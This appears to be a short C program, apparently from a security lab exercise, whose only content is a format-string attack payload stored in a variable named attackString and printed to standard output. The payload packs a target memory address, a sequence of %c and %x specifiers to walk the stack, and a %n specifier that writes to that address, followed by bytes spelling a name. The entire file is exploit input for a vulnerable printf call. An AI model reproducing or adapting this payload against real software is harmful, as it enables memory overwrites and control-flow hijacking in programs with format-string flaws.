#include <stdio.h>

char attackString[] = "\x1c\xa0\x04\x08%c%c%c%c%c%c%c%x%x%x%x%x%x%x%x%x%x%x%n\n\x53\x74\x65\x76\x65\x20\x53\x75\x6e\x20";

int main() {
	printf("%s",&attackString);
	return 0; 
}
